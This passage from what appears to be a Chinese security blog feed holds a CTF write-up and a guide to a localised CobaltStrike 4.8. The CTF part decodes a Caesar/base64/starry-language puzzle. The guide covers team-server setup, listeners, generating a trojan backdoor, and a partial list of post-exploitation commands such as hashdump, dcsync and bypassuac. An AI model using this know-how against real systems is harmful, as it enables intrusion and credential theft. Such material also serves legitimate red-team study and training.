hLzphJDBhJDBhJDthJDphJDBhJDtrJDBhJDBhJDBLLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLhphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJD4hJDBhJD4hLzBhJDBhJDBvJDBhJDBsJDBhJDBhJDBsJDBrDjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphLzBhJDBhJDBvJDBhJDBsJDBhJDBhJDBLLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBsLhphLzBhJD4hJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhDjBsLjBsJDBhJDBhJD4hJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDBhJDthJDpLJDBhJDBhJDtrLjBsJDBhJDBvJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJBphJDthJDphJDBhJDBsLjBsJDBhMjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhDjBhJDBhLzBhLjBhJDBhJDtrJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDtrJDBhJDBhJDBLLzBhLjBhJDBhLzphJDBhJD4hLzBhJDBhMjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLhphJDBhJDBhJDthJDphJDBhJDtrJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhDjBhJDBsJDBrJDBhJDBsLjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBLJDphJDBhJDtrJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJBphLzphJDBhJDBhMjBhJDBhJDBvJDBhJDBhJD4hLzBhJDBhMjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDBhJDthDjBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBsJDBhJDBvJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDtrJDBhJDBhJDBLLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBsLjBsJDBhJDBhJD4hJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjBhJBphJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsDjBhLjBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDthJDBhJDBhJDthJDphJDBLJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhMjBhJDBhMjBsJDBhMjBhJDBhLxphJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDthJDBhDjBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDthJDBhJDBLJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhLzBhJDBhJDBhLxphJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphMjBvJD4hLzBhJDBhMjBhJDBhDjthJDBhJDBhJDthJDphJDBhJDBsLjBrJDthJDBhJD4hJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDBhJDthJDphJDBLJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJBphJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhDjBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBLJDthJDphJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBsJDBhJDBhJDBsJDBrJBphJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhMjBhJDBhMjBhJDBhMjBhJDBhDj4hLzBhJDBhMjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBLJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDthJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhLxprJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhDjBhJDthJDphJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhLzphMjBvJDthMjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBLJDBhJDthJDphJDBhJDBsLjBsJDBhJDBhJD4</span><span class="operator">=</span></span><br></pre></td></tr></table></figure><blockquote><p>看到末尾的=，想到base64，所以是凯撒与base64的结合。</p><p>先用脚本爆破凯撒，将结果用base64编码</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># 截取文件最前面一部分进行猜测，因为根据后面可知这一部分是近似的四字符反复重复</span></span><br><span class="line">key = <span class="string">&quot;JDBhJDBsJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBh&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 遍历凯撒加密中25种的可能性</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">26</span>):</span><br><span class="line">    str_encrypt = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> letter <span class="keyword">in</span> key:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;a&quot;</span> &lt;= letter &lt;= <span class="string">&quot;z&quot;</span>:</span><br><span class="line">            str_encrypt += <span class="built_in">chr</span>((<span class="built_in">ord</span>(letter) - <span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>) + n) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>))</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;A&quot;</span> &lt;= letter &lt;= <span class="string">&quot;Z&quot;</span>:</span><br><span class="line">            str_encrypt += <span class="built_in">chr</span>((<span class="built_in">ord</span>(letter) - <span class="built_in">ord</span>(<span class="string">&quot;A&quot;</span>) + n) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&quot;A&quot;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            str_encrypt += letter</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 输出每一种可能性最后的结果</span></span><br><span class="line">    <span class="built_in">print</span>(base64.decodebytes(str_encrypt.encode()))</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241119234133869.png" alt="image-20241119234133869"></p><blockquote><p>结果中发现只有当n=25时，会出现starry语言特有的+，*等符号</p><p>于是用脚本将其全部转化成starry语言</p></blockquote><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">with <span class="keyword">open</span>(<span class="string">&quot;C:<span class="subst">\\</span>Users<span class="subst">\\</span>Lucky<span class="subst">\\</span>Desktop<span class="subst">\\</span>华科杯<span class="subst">\\</span>misc<span class="subst">\\</span>一闪一闪亮晶晶<span class="subst">\\</span>flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding<span class="operator">=</span><span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:    #flag.txt是凯撒密码的文本</span><br><span class="line">    str_encrypt <span class="operator">=</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    n <span class="operator">=</span> <span class="number">25</span></span><br><span class="line">    <span class="keyword">for</span> letter <span class="keyword">in</span> f.read():</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;a&quot;</span> <span class="operator">&lt;=</span> letter <span class="operator">&lt;=</span> <span class="string">&quot;z&quot;</span>:</span><br><span class="line">            str_encrypt <span class="operator">+=</span> chr((ord(letter) <span class="operator">-</span> ord(<span class="string">&quot;a&quot;</span>) <span class="operator">+</span> n) <span class="operator">%</span> <span class="number">26</span> <span class="operator">+</span> ord(<span class="string">&quot;a&quot;</span>))</span><br><span class="line">        elif <span class="string">&quot;A&quot;</span> <span class="operator">&lt;=</span> letter <span class="operator">&lt;=</span> <span class="string">&quot;Z&quot;</span>:</span><br><span class="line">            str_encrypt <span class="operator">+=</span> chr((ord(letter) <span class="operator">-</span> ord(<span class="string">&quot;A&quot;</span>) <span class="operator">+</span> n) <span class="operator">%</span> <span class="number">26</span> <span class="operator">+</span> ord(<span class="string">&quot;A&quot;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            str_encrypt <span class="operator">+=</span> letter</span><br><span class="line">    <span class="keyword">open</span>(<span class="string">&quot;C:<span class="subst">\\</span>Users<span class="subst">\\</span>Lucky<span class="subst">\\</span>Desktop<span class="subst">\\</span>华科杯<span class="subst">\\</span>misc<span class="subst">\\</span>一闪一闪亮晶晶<span class="subst">\\</span>flag.starry&quot;</span>, <span class="string">&quot;wb&quot;</span>).write(base64.decodebytes(str_encrypt.encode()))</span><br></pre></td></tr></table></figure><blockquote><p>最后用starry语言转换脚本转换就能得到flag</p></blockquote><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">fp = <span class="built_in">open</span>(<span class="string">&#x27;C:\\Users\\Lucky\\Desktop\\华科杯\\misc\\一闪一闪亮晶晶\\flag.starry&#x27;</span>)     <span class="selector-id">#flag</span>.starry是保存的starry语言文件</span><br><span class="line">data = fp<span class="selector-class">.read</span>()</span><br><span class="line">fs = <span class="built_in">open</span>(<span class="string">&#x27;C:\\Users\\Lucky\\Desktop\\华科杯\\misc\\一闪一闪亮晶晶\\f.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)       <span class="selector-id">#f</span>.txt是输出的中间文件</span><br><span class="line">sub = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">if</span> <span class="selector-tag">i</span> == <span class="string">&#x27;\n&#x27;</span>:</span><br><span class="line">        continue</span><br><span class="line">    elif <span class="selector-tag">i</span> == <span class="string">&#x27; &#x27;</span>:</span><br><span class="line">        sub += <span class="number">1</span></span><br><span class="line">    elif <span class="selector-tag">i</span> == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> sub == <span class="number">1</span>:</span><br><span class="line">            fs<span class="selector-class">.write</span>(<span class="string">&#x27;dup\n&#x27;</span>)</span><br><span class="line">            sub = <span class="number">0</span></span><br><span class="line">        elif sub == <span class="number">2</span>:</span><br><span class="line">            fs<span class="selector-class">.write</span>(<span class="string">&#x27;swap\n&#x27;</span>)</span><br><span class="line">            sub = <span class="number">0</span></span><br><span class="line">        elif sub == <span class="number">3</span>:</span><br><span class="line">            fs<span class="selector-class">.write</span>(<span class="string">&#x27;rotate\n&#x27;</span>)</span><br><span class="line">            sub = <span class="number">0</span></span><br><span class="line">        elif sub == <span class="number">4</span>:</span><br><span class="line">            fs<span class="selector-class">.write</span>(<span class="string">&#x27;pop\n&#x27;</span>)</span><br><span class="line">            sub = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            fs<span class="selector-class">.write</span>(<span class="string">&#x27;push  &#x27;</span> + <span class="built_in">str</span>(sub-<span class="number">5</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            sub = <span class="number">0</span></span><br><span class="line">    elif <span class="selector-tag">i</span> == <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> sub == <span class="number">0</span>:</span><br><span class="line">            fs<span class="selector-class">.write</span>(<span class="string">&#x27;+\n&#x27;</span>)</span><br><span class="line">            sub = <span class="number">0</span></span><br><span class="line">        elif sub == <span class="number">1</span>:</span><br><span class="line">            fs<span class="selector-class">.write</span>(<span class="string">&#x27;-\n&#x27;</span>)</span><br><span class="line">            sub = <span class="number">0</span></span><br><span class="line">        elif sub == <span class="number">2</span>:</span><br><span class="line">            fs<span class="selector-class">.write</span>(<span class="string">&#x27;*\n&#x27;</span>)</span><br><span class="line">            sub = <span class="number">0</span></span><br><span class="line">        elif sub == <span class="number">3</span>:</span><br><span class="line">            fs<span class="selector-class">.write</span>(<span class="string">&#x27;/\n&#x27;</span>)</span><br><span class="line">            sub = <span class="number">0</span></span><br><span class="line">        elif sub == <span class="number">4</span>:</span><br><span class="line">            fs<span class="selector-class">.write</span>(<span class="string">&#x27;%\n&#x27;</span>)</span><br><span class="line">            sub = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;error!!!&#x27;</span>)</span><br><span class="line">            sub = <span class="number">0</span></span><br><span class="line">            sys<span class="selector-class">.exit</span>()</span><br><span class="line">    elif <span class="selector-tag">i</span> == <span class="string">&#x27;.&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> sub == <span class="number">0</span>:</span><br><span class="line">            fs<span class="selector-class">.write</span>(<span class="string">&#x27;num_out\n&#x27;</span>)</span><br><span class="line">            sub = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            fs<span class="selector-class">.write</span>(<span class="string">&#x27;char_out\n&#x27;</span>)</span><br><span class="line">            sub = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;error!!!!&#x27;</span>)</span><br><span class="line">        sys<span class="selector-class">.exit</span>()</span><br><span class="line">fp<span class="selector-class">.close</span>()</span><br><span class="line">fs<span class="selector-class">.close</span>()</span><br><span class="line">fp = <span class="built_in">open</span>(<span class="string">&#x27;C:\\Users\\Lucky\\Desktop\\华科杯\\misc\\一闪一闪亮晶晶\\f.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">data = <span class="selector-attr">[]</span></span><br><span class="line"><span class="keyword">for</span> <span class="selector-tag">line</span> <span class="keyword">in</span> fp:</span><br><span class="line">    <span class="selector-tag">line</span> = <span class="selector-tag">line</span><span class="selector-class">.strip</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="selector-tag">line</span><span class="selector-attr">[:4]</span> == <span class="string">&#x27;push&#x27;</span>:</span><br><span class="line">        data<span class="selector-class">.append</span>(<span class="built_in">int</span>(<span class="selector-tag">line</span><span class="selector-class">.split</span>(<span class="string">&#x27;  &#x27;</span>)<span class="selector-attr">[1]</span>))</span><br><span class="line">    elif <span class="selector-tag">line</span> == <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">        <span class="attribute">x</span> = data[-<span class="number">1</span>]</span><br><span class="line">        <span class="attribute">y</span> = data[-<span class="number">2</span>]</span><br><span class="line">        data = data<span class="selector-attr">[:-2]</span></span><br><span class="line">        data<span class="selector-class">.append</span>(<span class="attribute">x</span> * y)</span><br><span class="line">    elif <span class="selector-tag">line</span> == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">        <span class="attribute">x</span> = data[-<span class="number">1</span>]</span><br><span class="line">        <span class="attribute">y</span> = data[-<span class="number">2</span>]</span><br><span class="line">        data = data<span class="selector-attr">[:-2]</span></span><br><span class="line">        data<span class="selector-class">.append</span>(<span class="attribute">x</span> + y)</span><br><span class="line">    elif <span class="selector-tag">line</span> == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">        <span class="attribute">x</span> = data[-<span class="number">1</span>]</span><br><span class="line">        <span class="attribute">y</span> = data[-<span class="number">2</span>]</span><br><span class="line">        data = data<span class="selector-attr">[:-2]</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="attribute">x</span>-y)&lt;<span class="number">0</span>:</span><br><span class="line">            data<span class="selector-class">.append</span>(<span class="attribute">y</span>-x)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data<span class="selector-class">.append</span>(<span class="attribute">x</span>-y)</span><br><span class="line">    elif <span class="selector-tag">line</span> == <span class="string">&#x27;dup&#x27;</span>:</span><br><span class="line">        <span class="attribute">x</span> = data[-<span class="number">1</span>]</span><br><span class="line">        data<span class="selector-class">.append</span>(<span class="attribute">x</span>)</span><br><span class="line">    elif <span class="selector-tag">line</span> == <span class="string">&#x27;char_out&#x27;</span>:</span><br><span class="line">        <span class="attribute">x</span> = data[-<span class="number">1</span>]</span><br><span class="line">        data = data<span class="selector-attr">[:-1]</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="attribute">x</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;error!!!&#x27;</span>)</span><br><span class="line">        sys<span class="selector-class">.exit</span>()</span><br></pre></td></tr></table></figure><blockquote><p>flag{785c45ea-d2a1-4993-8d4f-325323d5bcd9}</p></blockquote>]]></content>
    
    
    <summary type="html">🥧华科第一届网络安全挑战赛wp</summary>
    
    
    
    <category term="CTF" scheme="https://m3ngx1ng.github.io/categories/CTF/"/>
    
    
    <category term="比赛wp" scheme="https://m3ngx1ng.github.io/tags/%E6%AF%94%E8%B5%9Bwp/"/>
    
  </entry>
  
  <entry>
    <title>CobaltStrike4.8汉化版带插件使用方法</title>
    <link href="https://m3ngx1ng.github.io/posts/4aeca11a.html"/>
    <id>https://m3ngx1ng.github.io/posts/4aeca11a.html</id>
    <published>2024-11-17T16:00:00.000Z</published>
    <updated>2024-12-02T09:11:35.855Z</updated>
    
    <content type="html"><![CDATA[<h1>CobaltStrike4.8汉化版带插件使用方法</h1><p>使用大致流程<br>创建团队服务器-&gt;客户端连接服务器-&gt;创建监听器-&gt;生成后门对应监听器-&gt;靶机运行后门成功上线-&gt;后渗透（提权，内网漫游，域渗透等）</p><h2 id="一、安装">一、安装</h2><p><img src="https://i-blog.csdnimg.cn/blog_migrate/fd8da35e28b5c9bc7b8132070b54a3c7.png" alt="在这里插入图片描述"><br>把全部文件下上传到外网VPS上，并给足权限<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1d68638ddd135505086d548f1c394c61.png" alt="在这里插入图片描述"><br>服务端运行起来<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/eff03a78ec9383205a4be2c0f9c6effc.png" alt="在这里插入图片描述"></p><p>本地电脑使用<a href="https://so.csdn.net/so/search?q=%E5%AE%A2%E6%88%B7%E7%AB%AF&amp;spm=1001.2101.3001.7020">客户端</a>连接即可<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/6dad38954540036b265ccfa25241ffe7.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2f791f60db73100ac4a92527dce51fe9.png" alt="在这里插入图片描述"><br>主要输入<code>HOST、Port、password</code>即可</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/bb05f44ff7b7c4ec14c9563d55efb2d3.png" alt="在这里插入图片描述"></p><h2 id="二、上线">二、上线</h2><h3 id="1、设置监听器">1、设置监听器</h3><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/e1a94fb37712fac9533688c672ea9028.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/b8c145b86c42438ac11b4b3350b249e9.png" alt="在这里插入图片描述"></p><h3 id="2、生成木马后门">2、生成木马后门</h3><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/56362e228cba526ec1c3ca073c78d34c.png" alt="在这里插入图片描述"></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/90ad2a56214be9a95dad682bd75de839.png" alt="在这里插入图片描述"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/006995bcb55100b36211940a6e3fb6f0.png" alt="在这里插入图片描述"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/d2a9e1f98caa9d8913a74c34750058a5.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/59550d2c11e32bc849fd98fb2e140011.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/19fe4aeb1089455d9cd7935350e4a682.png" alt="在这里插入图片描述"><br>运行即可上线CS<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/4dffee027c99823dac41e8f4baf87f5f.png" alt="在这里插入图片描述"></p><p>3、指令大全</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">browserpivot 注入受害者浏览器进程</span><br><span class="line"><span class="built_in">sleep</span> <span class="number">3</span> 全部命令<span class="number">3</span>秒执行</span><br><span class="line">bypassuac 绕过UAC</span><br><span class="line">cancel 取消正在进行的下载</span><br><span class="line">cd 切换目录</span><br><span class="line">checkin 强制让被控端回连一次</span><br><span class="line">clear 清除beacon内部的任务队列</span><br><span class="line">connect Connect to a Beacon peerover TCP</span><br><span class="line">covertvpn 部署Covert VPN客户端</span><br><span class="line">cp 复制文件</span><br><span class="line">dcsync 从DC中提取密码哈希</span><br><span class="line">desktop 远程VNC</span><br><span class="line">dllinject 反射DLL注入进程</span><br><span class="line">dllload 使用LoadLibrary将DLL加载到进程中</span><br><span class="line">download 下载文件</span><br><span class="line">downloads 列出正在进行的文件下载</span><br><span class="line">drives 列出目标盘符</span><br><span class="line">elevate 尝试提权</span><br><span class="line">execute 在目标上执行程序(无输出)</span><br><span class="line">execute-assembly 在目标上内存中执行本地.NET程序</span><br><span class="line">exit 退出beacon</span><br><span class="line">getprivs Enable <span class="keyword">system</span> privileges oncurrent token</span><br><span class="line">getsystem 尝试获取<span class="keyword">SYSTEM</span>权限</span><br><span class="line">getuid 获取用户ID</span><br><span class="line">hashdump 转储密码哈希值</span><br><span class="line">help 帮助</span><br><span class="line">inject 